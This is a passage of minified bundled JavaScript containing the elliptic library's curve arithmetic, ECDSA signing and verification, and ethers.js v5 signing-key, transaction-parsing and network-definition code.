u=this.x.redSqr(),h=this.y.redSqr(),d=h.redSqr(),f=this.x.redAdd(h).redSqr().redISub(u).redISub(d);f=f.redIAdd(f);var p=u.redAdd(u).redIAdd(u),g=p.redSqr(),m=d.redIAdd(d);m=(m=m.redIAdd(m)).redIAdd(m),e=g.redISub(f).redISub(f),t=p.redMul(f.redISub(e)).redISub(m),r=(r=this.y.redMul(this.z)).redIAdd(r)}return this.curve.jpoint(e,t,r)},qn.prototype._threeDbl=function(){var e,t,r;if(this.zOne){var n=this.x.redSqr(),i=this.y.redSqr(),o=i.redSqr(),s=this.x.redAdd(i).redSqr().redISub(n).redISub(o);s=s.redIAdd(s);var a=n.redAdd(n).redIAdd(n).redIAdd(this.curve.a),c=a.redSqr().redISub(s).redISub(s);e=c;var l=o.redIAdd(o);l=(l=l.redIAdd(l)).redIAdd(l),t=a.redMul(s.redISub(c)).redISub(l),r=this.y.redAdd(this.y)}else{var u=this.z.redSqr(),h=this.y.redSqr(),d=this.x.redMul(h),f=this.x.redSub(u).redMul(this.x.redAdd(u));f=f.redAdd(f).redIAdd(f);var p=d.redIAdd(d),g=(p=p.redIAdd(p)).redAdd(p);e=f.redSqr().redISub(g),r=this.y.redAdd(this.z).redSqr().redISub(h).redISub(u);var m=h.redSqr();m=(m=(m=m.redIAdd(m)).redIAdd(m)).redIAdd(m),t=f.redMul(p.redISub(e)).redISub(m)}return this.curve.jpoint(e,t,r)},qn.prototype._dbl=function(){var e=this.curve.a,t=this.x,r=this.y,n=this.z,i=n.redSqr().redSqr(),o=t.redSqr(),s=r.redSqr(),a=o.redAdd(o).redIAdd(o).redIAdd(e.redMul(i)),c=t.redAdd(t),l=(c=c.redIAdd(c)).redMul(s),u=a.redSqr().redISub(l.redAdd(l)),h=l.redISub(u),d=s.redSqr();d=(d=(d=d.redIAdd(d)).redIAdd(d)).redIAdd(d);var f=a.redMul(h).redISub(d),p=r.redAdd(r).redMul(n);return this.curve.jpoint(u,f,p)},qn.prototype.trpl=function(){if(!this.curve.zeroA)return this.dbl().add(this);var e=this.x.redSqr(),t=this.y.redSqr(),r=this.z.redSqr(),n=t.redSqr(),i=e.redAdd(e).redIAdd(e),o=i.redSqr(),s=this.x.redAdd(t).redSqr().redISub(e).redISub(n),a=(s=(s=(s=s.redIAdd(s)).redAdd(s).redIAdd(s)).redISub(o)).redSqr(),c=n.redIAdd(n);c=(c=(c=c.redIAdd(c)).redIAdd(c)).redIAdd(c);var l=i.redIAdd(s).redSqr().redISub(o).redISub(a).redISub(c),u=t.redMul(l);u=(u=u.redIAdd(u)).redIAdd(u);var h=this.x.redMul(a).redISub(u);h=(h=h.redIAdd(h)).redIAdd(h);var d=this.y.redMul(l.redMul(c.redISub(l)).redISub(s.redMul(a)));d=(d=(d=d.redIAdd(d)).redIAdd(d)).redIAdd(d);var f=this.z.redAdd(s).redSqr().redISub(r).redISub(a);return this.curve.jpoint(h,d,f)},qn.prototype.mul=function(e,t){return e=new Ot(e,t),this.curve._wnafMul(this,e)},qn.prototype.eq=function(e){if("affine"===e.type)return this.eq(e.toJ());if(this===e)return!0;var t=this.z.redSqr(),r=e.z.redSqr();if(0!==this.x.redMul(r).redISub(e.x.redMul(t)).cmpn(0))return!1;var n=t.redMul(this.z),i=r.redMul(e.z);return 0===this.y.redMul(i).redISub(e.y.redMul(n)).cmpn(0)},qn.prototype.eqXToP=function(e){var t=this.z.redSqr(),r=e.toRed(this.curve.red).redMul(t);if(0===this.x.cmp(r))return!0;for(var n=e.clone(),i=this.curve.redN.redMul(t);;){if(n.iadd(this.curve.n),n.cmp(this.curve.p)>=0)return!1;if(r.redIAdd(i),0===this.x.cmp(r))return!0}},qn.prototype.inspect=function(){return this.isInfinity()?"<EC JPoint Infinity>":"<EC JPoint x: "+this.x.toString(16,2)+" y: "+this.y.toString(16,2)+" z: "+this.z.toString(16,2)+">"},qn.prototype.isInfinity=function(){return 0===this.z.cmpn(0)};var rg=ph((function(e,t){var r=t;r.base=fu,r.short=Yee,r.mont=null,r.edwards=null})),ng=ph((function(e,t){var r,n=t,i=hs.assert;function o(e){"short"===e.type?this.curve=new rg.short(e):"edwards"===e.type?this.curve=new rg.edwards(e):this.curve=new rg.mont(e),this.g=this.curve.g,this.n=this.curve.n,this.hash=e.hash,i(this.g.validate(),"Invalid curve"),i(this.g.mul(this.n).isInfinity(),"Invalid curve, G*N != O")}function s(e,t){Object.defineProperty(n,e,{configurable:!0,enumerable:!0,get:function(){var r=new o(t);return Object.defineProperty(n,e,{configurable:!0,enumerable:!0,value:r}),r}})}n.PresetCurve=o,s("p192",{type:"short",prime:"p192",p:"ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff",a:"ffffffff ffffffff ffffffff fffffffe ffffffff fffffffc",b:"64210519 e59c80e7 0fa7e9ab 72243049 feb8deec c146b9b1",n:"ffffffff ffffffff ffffffff 99def836 146bc9b1 b4d22831",hash:$o.sha256,gRed:!1,g:["188da80e b03090f6 7cbf20eb 43a18800 f4ff0afd 82ff1012","07192b95 ffc8da78 631011ed 6b24cdd5 73f977a1 1e794811"]}),s("p224",{type:"short",prime:"p224",p:"ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001",a:"ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff fffffffe",b:"b4050a85 0c04b3ab f5413256 5044b0b7 d7bfd8ba 270b3943 2355ffb4",n:"ffffffff ffffffff ffffffff ffff16a2 e0b8f03e 13dd2945 5c5c2a3d",hash:$o.sha256,gRed:!1,g:["b70e0cbd 6bb4bf7f 321390b9 4a03c1d3 56c21122 343280d6 115c1d21","bd376388 b5f723fb 4c22dfe6 cd4375a0 5a074764 44d58199 85007e34"]}),s("p256",{type:"short",prime:null,p:"ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff ffffffff",a:"ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff fffffffc",b:"5ac635d8 aa3a93e7 b3ebbd55 769886bc 651d06b0 cc53b0f6 3bce3c3e 27d2604b",n:"ffffffff 00000000 ffffffff ffffffff bce6faad a7179e84 f3b9cac2 fc632551",hash:$o.sha256,gRed:!1,g:["6b17d1f2 e12c4247 f8bce6e5 63a440f2 77037d81 2deb33a0 f4a13945 d898c296","4fe342e2 fe1a7f9b 8ee7eb4a 7c0f9e16 2bce3357 6b315ece cbb64068 37bf51f5"]}),s("p384",{type:"short",prime:null,p:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 ffffffff",a:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 fffffffc",b:"b3312fa7 e23ee7e4 988e056b e3f82d19 181d9c6e fe814112 0314088f 5013875a c656398d 8a2ed19d 2a85c8ed d3ec2aef",n:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff c7634d81 f4372ddf 581a0db2 48b0a77a ecec196a ccc52973",hash:$o.sha384,gRed:!1,g:["aa87ca22 be8b0537 8eb1c71e f320ad74 6e1d3b62 8ba79b98 59f741e0 82542a38 5502f25d bf55296c 3a545e38 72760ab7","3617de4a 96262c6f 5d9e98bf 9292dc29 f8f41dbd 289a147c e9da3113 b5f0b8c0 0a60b1ce 1d7e819d 7a431d7c 90ea0e5f"]}),s("p521",{type:"short",prime:null,p:"000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff",a:"000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffc",b:"00000051 953eb961 8e1c9a1f 929a21a0 b68540ee a2da725b 99b315f3 b8b48991 8ef109e1 56193951 ec7e937b 1652c0bd 3bb1bf07 3573df88 3d2c34f1 ef451fd4 6b503f00",n:"000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffa 51868783 bf2f966b 7fcc0148 f709a5d0 3bb5c9b8 899c47ae bb6fb71e 91386409",hash:$o.sha512,gRed:!1,g:["000000c6 858e06b7 0404e9cd 9e3ecb66 2395b442 9c648139 053fb521 f828af60 6b4d3dba a14b5e77 efe75928 fe1dc127 a2ffa8de 3348b3c1 856a429b f97e7e31 c2e5bd66","00000118 39296a78 9a3bc004 5c8a5fb4 2c7d1bd9 98f54449 579b4468 17afbd17 273e662c 97ee7299 5ef42640 c550b901 3fad0761 353c7086 a272c240 88be9476 9fd16650"]}),s("curve25519",{type:"mont",prime:"p25519",p:"7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed",a:"76d06",b:"1",n:"1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed",hash:$o.sha256,gRed:!1,g:["9"]}),s("ed25519",{type:"edwards",prime:"p25519",p:"7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed",a:"-1",c:"1",d:"52036cee2b6ffe73 8cc740797779e898 00700a4d4141d8ab 75eb4dca135978a3",n:"1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed",hash:$o.sha256,gRed:!1,g:["216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a","6666666666666666666666666666666666666666666666666666666666666658"]});try{r=null.crash()}catch{r=void 0}s("secp256k1",{type:"short",prime:"k256",p:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f",a:"0",b:"7",n:"ffffffff ffffffff ffffffff fffffffe baaedce6 af48a03b bfd25e8c d0364141",h:"1",hash:$o.sha256,beta:"7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee",lambda:"5363ad4cc05c30e0a5261c028812645a122e22ea20816678df02967c1b23bd72",basis:[{a:"3086d221a7d46bcde86c90e49284eb15",b:"-e4437ed6010e88286f547fa90abfe4c3"},{a:"114ca50f7a8e2f3f657c1108d9d44cfd8",b:"3086d221a7d46bcde86c90e49284eb15"}],gRed:!1,g:["79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798","483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8",r]})}));function Lc(e){if(!(this instanceof Lc))return new Lc(e);this.hash=e.hash,this.predResist=!!e.predResist,this.outLen=this.hash.outSize,this.minEntropy=e.minEntropy||this.hash.hmacStrength,this._reseed=null,this.reseedInterval=null,this.K=null,this.V=null;var t=go.toArray(e.entropy,e.entropyEnc||"hex"),r=go.toArray(e.nonce,e.nonceEnc||"hex"),n=go.toArray(e.pers,e.persEnc||"hex");v_(t.length>=this.minEntropy/8,"Not enough entropy. Minimum is: "+this.minEntropy+" bits"),this._init(t,r,n)}var k7=Lc;Lc.prototype._init=function(e,t,r){var n=e.concat(t).concat(r);this.K=new Array(this.outLen/8),this.V=new Array(this.outLen/8);for(var i=0;i<this.V.length;i++)this.K[i]=0,this.V[i]=1;this._update(n),this._reseed=1,this.reseedInterval=281474976710656},Lc.prototype._hmac=function(){return new $o.hmac(this.hash,this.K)},Lc.prototype._update=function(e){var t=this._hmac().update(this.V).update([0]);e&&(t=t.update(e)),this.K=t.digest(),this.V=this._hmac().update(this.V).digest(),e&&(this.K=this._hmac().update(this.V).update([1]).update(e).digest(),this.V=this._hmac().update(this.V).digest())},Lc.prototype.reseed=function(e,t,r,n){"string"!=typeof t&&(n=r,r=t,t=null),e=go.toArray(e,t),r=go.toArray(r,n),v_(e.length>=this.minEntropy/8,"Not enough entropy. Minimum is: "+this.minEntropy+" bits"),this._update(e.concat(r||[])),this._reseed=1},Lc.prototype.generate=function(e,t,r,n){if(this._reseed>this.reseedInterval)throw new Error("Reseed is required");"string"!=typeof t&&(n=r,r=t,t=null),r&&(r=go.toArray(r,n||"hex"),this._update(r));for(var i=[];i.length<e;)this.V=this._hmac().update(this.V).digest(),i=i.concat(this.V);var o=i.slice(0,e);return this._update(r),this._reseed++,go.encode(o,t)};var B2=hs.assert;function si(e,t){this.ec=e,this.priv=null,this.pub=null,t.priv&&this._importPrivate(t.priv,t.privEnc),t.pub&&this._importPublic(t.pub,t.pubEnc)}var b_=si;si.fromPublic=function(e,t,r){return t instanceof si?t:new si(e,{pub:t,pubEnc:r})},si.fromPrivate=function(e,t,r){return t instanceof si?t:new si(e,{priv:t,privEnc:r})},si.prototype.validate=function(){var e=this.getPublic();return e.isInfinity()?{result:!1,reason:"Invalid public key"}:e.validate()?e.mul(this.ec.curve.n).isInfinity()?{result:!0,reason:null}:{result:!1,reason:"Public key * N != O"}:{result:!1,reason:"Public key is not a point"}},si.prototype.getPublic=function(e,t){return"string"==typeof e&&(t=e,e=null),this.pub||(this.pub=this.ec.g.mul(this.priv)),t?this.pub.encode(t,e):this.pub},si.prototype.getPrivate=function(e){return"hex"===e?this.priv.toString(16,2):this.priv},si.prototype._importPrivate=function(e,t){this.priv=new Ot(e,t||16),this.priv=this.priv.umod(this.ec.curve.n)},si.prototype._importPublic=function(e,t){if(e.x||e.y)return"mont"===this.ec.curve.type?B2(e.x,"Need x coordinate"):("short"===this.ec.curve.type||"edwards"===this.ec.curve.type)&&B2(e.x&&e.y,"Need both x and y coordinate"),void(this.pub=this.ec.curve.point(e.x,e.y));this.pub=this.ec.curve.decodePoint(e,t)},si.prototype.derive=function(e){return e.validate()||B2(e.validate(),"public point not validated"),e.mul(this.priv).getX()},si.prototype.sign=function(e,t,r){return this.ec.sign(e,this,t,r)},si.prototype.verify=function(e,t){return this.ec.verify(e,t,this)},si.prototype.inspect=function(){return"<Key priv: "+(this.priv&&this.priv.toString(16,2))+" pub: "+(this.pub&&this.pub.inspect())+" >"};var Xee=hs.assert;function zv(e,t){if(e instanceof zv)return e;this._importDER(e,t)||(Xee(e.r&&e.s,"Signature without r or s"),this.r=new Ot(e.r,16),this.s=new Ot(e.s,16),void 0===e.recoveryParam?this.recoveryParam=null:this.recoveryParam=e.recoveryParam)}var Hv=zv;function ete(){this.place=0}function Qw(e,t){var r=e[t.place++];if(!(128&r))return r;var n=15&r;if(0===n||n>4)return!1;for(var i=0,o=0,s=t.place;o<n;o++,s++)i<<=8,i|=e[s],i>>>=0;return!(i<=127)&&(t.place=s,i)}function A8(e){for(var t=0,r=e.length-1;!e[t]&&!(128&e[t+1])&&t<r;)t++;return 0===t?e:e.slice(t)}function Yw(e,t){if(t<128)e.push(t);else{var r=1+(Math.log(t)/Math.LN2>>>3);for(e.push(128|r);--r;)e.push(t>>>(r<<3)&255);e.push(t)}}zv.prototype._importDER=function(e,t){e=hs.toArray(e,t);var r=new ete;if(48!==e[r.place++])return!1;var n=Qw(e,r);if(!1===n||n+r.place!==e.length||2!==e[r.place++])return!1;var i=Qw(e,r);if(!1===i)return!1;var o=e.slice(r.place,i+r.place);if(r.place+=i,2!==e[r.place++])return!1;var s=Qw(e,r);if(!1===s||e.length!==s+r.place)return!1;var a=e.slice(r.place,s+r.place);if(0===o[0]){if(!(128&o[1]))return!1;o=o.slice(1)}if(0===a[0]){if(!(128&a[1]))return!1;a=a.slice(1)}return this.r=new Ot(o),this.s=new Ot(a),this.recoveryParam=null,!0},zv.prototype.toDER=function(e){var t=this.r.toArray(),r=this.s.toArray();for(128&t[0]&&(t=[0].concat(t)),128&r[0]&&(r=[0].concat(r)),t=A8(t),r=A8(r);!(r[0]||128&r[1]);)r=r.slice(1);var n=[2];Yw(n,t.length),(n=n.concat(t)).push(2),Yw(n,r.length);var i=n.concat(r),o=[48];return Yw(o,i.length),o=o.concat(i),hs.encode(o,e)};var tte=function(){throw new Error("unsupported")},D7=hs.assert;function Fs(e){if(!(this instanceof Fs))return new Fs(e);"string"==typeof e&&(D7(Object.prototype.hasOwnProperty.call(ng,e),"Unknown curve "+e),e=ng[e]),e instanceof ng.PresetCurve&&(e={curve:e}),this.curve=e.curve.curve,this.n=this.curve.n,this.nh=this.n.ushrn(1),this.g=this.curve.g,this.g=e.curve.g,this.g.precompute(e.curve.n.bitLength()+1),this.hash=e.hash||e.curve.hash}var rte=Fs;Fs.prototype.keyPair=function(e){return new b_(this,e)},Fs.prototype.keyFromPrivate=function(e,t){return b_.fromPrivate(this,e,t)},Fs.prototype.keyFromPublic=function(e,t){return b_.fromPublic(this,e,t)},Fs.prototype.genKeyPair=function(e){e||(e={});for(var t=new k7({hash:this.hash,pers:e.pers,persEnc:e.persEnc||"utf8",entropy:e.entropy||tte(this.hash.hmacStrength),entropyEnc:e.entropy&&e.entropyEnc||"utf8",nonce:this.n.toArray()}),r=this.n.byteLength(),n=this.n.sub(new Ot(2));;){var i=new Ot(t.generate(r));if(!(i.cmp(n)>0))return i.iaddn(1),this.keyFromPrivate(i)}},Fs.prototype._truncateToN=function(e,t){var r=8*e.byteLength()-this.n.bitLength();return r>0&&(e=e.ushrn(r)),!t&&e.cmp(this.n)>=0?e.sub(this.n):e},Fs.prototype.sign=function(e,t,r,n){"object"==typeof r&&(n=r,r=null),n||(n={}),t=this.keyFromPrivate(t,r),e=this._truncateToN(new Ot(e,16));for(var i=this.n.byteLength(),o=t.getPrivate().toArray("be",i),s=e.toArray("be",i),a=new k7({hash:this.hash,entropy:o,nonce:s,pers:n.pers,persEnc:n.persEnc||"utf8"}),c=this.n.sub(new Ot(1)),l=0;;l++){var u=n.k?n.k(l):new Ot(a.generate(this.n.byteLength()));if(!((u=this._truncateToN(u,!0)).cmpn(1)<=0||u.cmp(c)>=0)){var h=this.g.mul(u);if(!h.isInfinity()){var d=h.getX(),f=d.umod(this.n);if(0!==f.cmpn(0)){var p=u.invm(this.n).mul(f.mul(t.getPrivate()).iadd(e));if(0!==(p=p.umod(this.n)).cmpn(0)){var g=(h.getY().isOdd()?1:0)|(0!==d.cmp(f)?2:0);return n.canonical&&p.cmp(this.nh)>0&&(p=this.n.sub(p),g^=1),new Hv({r:f,s:p,recoveryParam:g})}}}}}},Fs.prototype.verify=function(e,t,r,n){e=this._truncateToN(new Ot(e,16)),r=this.keyFromPublic(r,n);var i=(t=new Hv(t,"hex")).r,o=t.s;if(i.cmpn(1)<0||i.cmp(this.n)>=0||o.cmpn(1)<0||o.cmp(this.n)>=0)return!1;var s,a=o.invm(this.n),c=a.mul(e).umod(this.n),l=a.mul(i).umod(this.n);return this.curve._maxwellTrick?!(s=this.g.jmulAdd(c,r.getPublic(),l)).isInfinity()&&s.eqXToP(i):!(s=this.g.mulAdd(c,r.getPublic(),l)).isInfinity()&&0===s.getX().umod(this.n).cmp(i)},Fs.prototype.recoverPubKey=function(e,t,r,n){D7((3&r)===r,"The recovery param is more than two bits"),t=new Hv(t,n);var i=this.n,o=new Ot(e),s=t.r,a=t.s,c=1&r,l=r>>1;if(s.cmp(this.curve.p.umod(this.curve.n))>=0&&l)throw new Error("Unable to find sencond key candinate");s=l?this.curve.pointFromX(s.add(this.curve.n),c):this.curve.pointFromX(s,c);var u=t.r.invm(i),h=i.sub(o).mul(u).umod(i),d=a.mul(u).umod(i);return this.g.mulAdd(h,s,d)},Fs.prototype.getKeyRecoveryParam=function(e,t,r,n){if(null!==(t=new Hv(t,n)).recoveryParam)return t.recoveryParam;for(var i=0;i<4;i++){var o;try{o=this.recoverPubKey(e,t,i)}catch{continue}if(o.eq(r))return i}throw new Error("Unable to find valid recovery factor")};var nte=ph((function(e,t){var r=t;r.version="6.5.4",r.utils=hs,r.rand=function(){throw new Error("unsupported")},r.curve=rg,r.curves=ng,r.ec=rte,r.eddsa=null})),ite=nte.ec;const ste="signing-key/5.7.0",F2=new we(ste);let Xw=null;function jo(){return Xw||(Xw=new ite("secp256k1")),Xw}class ote{constructor(e){_t(this,"curve","secp256k1"),_t(this,"privateKey",kt(e)),32!==Vl(this.privateKey)&&F2.throwArgumentError("invalid private key","privateKey","[[ REDACTED ]]");const t=jo().keyFromPrivate(Lt(this.privateKey));_t(this,"publicKey","0x"+t.getPublic(!1,"hex")),_t(this,"compressedPublicKey","0x"+t.getPublic(!0,"hex")),_t(this,"_isSigningKey",!0)}_addPoint(e){const t=jo().keyFromPublic(Lt(this.publicKey)),r=jo().keyFromPublic(Lt(e));return"0x"+t.pub.add(r.pub).encodeCompressed("hex")}signDigest(e){const t=jo().keyFromPrivate(Lt(this.privateKey)),r=Lt(e);32!==r.length&&F2.throwArgumentError("bad digest length","digest",e);const n=t.sign(r,{canonical:!0});return Bv({recoveryParam:n.recoveryParam,r:Jr("0x"+n.r.toString(16),32),s:Jr("0x"+n.s.toString(16),32)})}computeSharedSecret(e){const t=jo().keyFromPrivate(Lt(this.privateKey)),r=jo().keyFromPublic(Lt($7(e)));return Jr("0x"+t.derive(r.getPublic()).toString(16),32)}static isSigningKey(e){return!(!e||!e._isSigningKey)}}function ate(e,t){const r=Bv(t),n={r:Lt(r.r),s:Lt(r.s)};return"0x"+jo().recoverPubKey(Lt(e),n,r.recoveryParam).encode("hex",!1)}function $7(e,t){const r=Lt(e);if(32===r.length){const e=new ote(r);return t?"0x"+jo().keyFromPrivate(r).getPublic(!0,"hex"):e.publicKey}return 33===r.length?t?kt(r):"0x"+jo().keyFromPublic(r).getPublic(!1,"hex"):65===r.length?t?"0x"+jo().keyFromPublic(r).getPublic(!0,"hex"):kt(r):F2.throwArgumentError("invalid public or private key","key","[REDACTED]")}const cte="transactions/5.7.0",Za=new we(cte);var I8;function w_(e){return"0x"===e?null:bo(e)}function ii(e){return"0x"===e?OY:Ke.from(e)}function lte(e){return bo(mi(Un(mi($7(e),1)),12))}function L7(e,t){return lte(ate(Lt(e),t))}function is(e,t){const r=Df(Ke.from(e).toHexString());return r.length>32&&Za.throwArgumentError("invalid length for "+t,"transaction:"+t,e),r}function ey(e,t){return{address:bo(e),storageKeys:(t||[]).map(((t,r)=>(32!==Vl(t)&&Za.throwArgumentError("invalid access list storageKey",`accessList[${e}:${r}]`,t),t.toLowerCase())))}}function U0(e){if(Array.isArray(e))return e.map(((e,t)=>Array.isArray(e)?(e.length>2&&Za.throwArgumentError("access list expected to be [ address, storageKeys[] ]",`value[${t}]`,e),ey(e[0],e[1])):ey(e.address,e.storageKeys)));const t=Object.keys(e).map((t=>{const r=e[t].reduce(((e,t)=>(e[t]=!0,e)),{});return ey(t,Object.keys(r).sort())}));return t.sort(((e,t)=>e.address.localeCompare(t.address))),t}function B7(e){return U0(e).map((e=>[e.address,e.storageKeys]))}function ute(e,t){if(null!=e.gasPrice){const t=Ke.from(e.gasPrice),r=Ke.from(e.maxFeePerGas||0);t.eq(r)||Za.throwArgumentError("mismatch EIP-1559 gasPrice != maxFeePerGas","tx",{gasPrice:t,maxFeePerGas:r})}const r=[is(e.chainId||0,"chainId"),is(e.nonce||0,"nonce"),is(e.maxPriorityFeePerGas||0,"maxPriorityFeePerGas"),is(e.maxFeePerGas||0,"maxFeePerGas"),is(e.gasLimit||0,"gasLimit"),null!=e.to?bo(e.to):"0x",is(e.value||0,"value"),e.data||"0x",B7(e.accessList||[])];if(t){const e=Bv(t);r.push(is(e.recoveryParam,"recoveryParam")),r.push(Df(e.r)),r.push(Df(e.s))}return ss(["0x02",Fv(r)])}function fte(e,t){const r=[is(e.chainId||0,"chainId"),is(e.nonce||0,"nonce"),is(e.gasPrice||0,"gasPrice"),is(e.gasLimit||0,"gasLimit"),null!=e.to?bo(e.to):"0x",is(e.value||0,"value"),e.data||"0x",B7(e.accessList||[])];if(t){const e=Bv(t);r.push(is(e.recoveryParam,"recoveryParam")),r.push(Df(e.r)),r.push(Df(e.s))}return ss(["0x01",Fv(r)])}function F7(e,t,r){try{const r=ii(t[0]).toNumber();if(0!==r&&1!==r)throw new Error("bad recid");e.v=r}catch{Za.throwArgumentError("invalid v for transaction type: 1","v",t[0])}e.r=Jr(t[1],32),e.s=Jr(t[2],32);try{const t=Un(r(e));e.from=L7(t,{r:e.r,s:e.s,recoveryParam:e.v})}catch{}}function hte(e){const t=h_(e.slice(1));9!==t.length&&12!==t.length&&Za.throwArgumentError("invalid component count for transaction type: 2","payload",kt(e));const r=ii(t[2]),n=ii(t[3]),i={type:2,chainId:ii(t[0]).toNumber(),nonce:ii(t[1]).toNumber(),maxPriorityFeePerGas:r,maxFeePerGas:n,gasPrice:null,gasLimit:ii(t[4]),to:w_(t[5]),value:ii(t[6]),data:t[7],accessList:U0(t[8])};return 9===t.length||(i.hash=Un(e),F7(i,t.slice(9),ute)),i}function dte(e){const t=h_(e.slice(1));8!==t.length&&11!==t.length&&Za.throwArgumentError("invalid component count for transaction type: 1","payload",kt(e));const r={type:1,chainId:ii(t[0]).toNumber(),nonce:ii(t[1]).toNumber(),gasPrice:ii(t[2]),gasLimit:ii(t[3]),to:w_(t[4]),value:ii(t[5]),data:t[6],accessList:U0(t[7])};return 8===t.length||(r.hash=Un(e),F7(r,t.slice(8),fte)),r}function pte(e){const t=h_(e);9!==t.length&&6!==t.length&&Za.throwArgumentError("invalid raw transaction","rawTransaction",e);const r={nonce:ii(t[0]).toNumber(),gasPrice:ii(t[1]),gasLimit:ii(t[2]),to:w_(t[3]),value:ii(t[4]),data:t[5],chainId:0};if(6===t.length)return r;try{r.v=Ke.from(t[6]).toNumber()}catch{return r}if(r.r=Jr(t[7],32),r.s=Jr(t[8],32),Ke.from(r.r).isZero()&&Ke.from(r.s).isZero())r.chainId=r.v,r.v=0;else{r.chainId=Math.floor((r.v-35)/2),r.chainId<0&&(r.chainId=0);let n=r.v-27;const i=t.slice(0,6);0!==r.chainId&&(i.push(kt(r.chainId)),i.push("0x"),i.push("0x"),n-=2*r.chainId+8);const o=Un(Fv(i));try{r.from=L7(o,{r:kt(r.r),s:kt(r.s),recoveryParam:n})}catch{}r.hash=Un(e)}return r.type=null,r}function gte(e){const t=Lt(e);if(t[0]>127)return pte(t);switch(t[0]){case 1:return dte(t);case 2:return hte(t)}return Za.throwError(`unsupported transaction type: ${t[0]}`,we.errors.UNSUPPORTED_OPERATION,{operation:"parseTransaction",transactionType:t[0]})}!function(e){e[e.legacy=0]="legacy",e[e.eip2930=1]="eip2930",e[e.eip1559=2]="eip1559"}(I8||(I8={}));class j7{constructor(e){_t(this,"alphabet",e),_t(this,"base",e.length),_t(this,"_alphabetMap",{}),_t(this,"_leader",e.charAt(0));for(let t=0;t<e.length;t++)this._alphabetMap[e.charAt(t)]=t}encode(e){let t=Lt(e);if(0===t.length)return"";let r=[0];for(let e=0;e<t.length;++e){let n=t[e];for(let e=0;e<r.length;++e)n+=r[e]<<8,r[e]=n%this.base,n=n/this.base|0;for(;n>0;)r.push(n%this.base),n=n/this.base|0}let n="";for(let e=0;0===t[e]&&e<t.length-1;++e)n+=this._leader;for(let e=r.length-1;e>=0;--e)n+=this.alphabet[r[e]];return n}decode(e){if("string"!=typeof e)throw new TypeError("Expected String");let t=[];if(0===e.length)return new Uint8Array(t);t.push(0);for(let r=0;r<e.length;r++){let n=this._alphabetMap[e[r]];if(void 0===n)throw new Error("Non-base"+this.base+" character");let i=n;for(let e=0;e<t.length;++e)i+=t[e]*this.base,t[e]=255&i,i>>=8;for(;i>0;)t.push(255&i),i>>=8}for(let r=0;e[r]===this._leader&&r<e.length-1;++r)t.push(0);return Lt(new Uint8Array(t.reverse()))}}new j7("abcdefghijklmnopqrstuvwxyz234567");const j2=new j7("123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz");function R8(e){return"0x"+$o.sha256().update(Lt(e)).digest("hex")}const vte="networks/5.7.1",T8=new we(vte);function mte(e){return e&&"function"==typeof e.renetwork}function Ma(e){const t=function(t,r){null==r&&(r={});const n=[];if(t.InfuraProvider&&"-"!==r.infura)try{n.push(new t.InfuraProvider(e,r.infura))}catch{}if(t.EtherscanProvider&&"-"!==r.etherscan)try{n.push(new t.EtherscanProvider(e,r.etherscan))}catch{}if(t.AlchemyProvider&&"-"!==r.alchemy)try{n.push(new t.AlchemyProvider(e,r.alchemy))}catch{}if(t.PocketProvider&&"-"!==r.pocket){const i=["goerli","ropsten","rinkeby","sepolia"];try{const o=new t.PocketProvider(e,r.pocket);o.network&&-1===i.indexOf(o.network.name)&&n.push(o)}catch{}}if(t.CloudflareProvider&&"-"!==r.cloudflare)try{n.push(new t.CloudflareProvider(e))}catch{}if(t.AnkrProvider&&"-"!==r.ankr)try{const i=["ropsten"],o=new t.AnkrProvider(e,r.ankr);o.network&&-1===i.indexOf(o.network.name)&&n.push(o)}catch{}if(0===n.length)return null;if(t.FallbackProvider){let i=1;return null!=r.quorum?i=r.quorum:"homestead"===e&&(i=2),new t.FallbackProvider(n,i)}return n[0]};return t.renetwork=function(e){return Ma(e)},t}function Vg(e,t){const r=function(r,n){return r.JsonRpcProvider?new r.JsonRpcProvider(e,t):null};return r.renetwork=function(t){return Vg(e,t)},r}const N8={chainId:1,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"homestead",_defaultProvider:Ma("homestead")},O8={chainId:3,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"ropsten",_defaultProvider:Ma("ropsten")},P8={chainId:63,name:"classicMordor",_defaultProvider:Vg("https://www.ethercluster.com/mordor","classicMordor")},A1={unspecified:{chainId:0,name:"unspecified"},homestead:N8,mainnet:N8,morden:{chainId:2,name:"morden"},ropsten:O8,testnet:O8,rinkeby:{chainId:4,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"rinkeby",_defaultProvider:Ma("rinkeby")},kovan:{chainId:42,name:"kovan",_defaultProvider:Ma("kovan")},goerli:{chainId:5,ensAddress:"0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e",name:"goerli",_defaultProvider:Ma("goerli")},kintsugi:{chainId:1337702,name:"kintsugi"},sepolia:{chainId:11155111,name:"sepolia",_defaultProvider:Ma("sepolia")},classic:{chainId: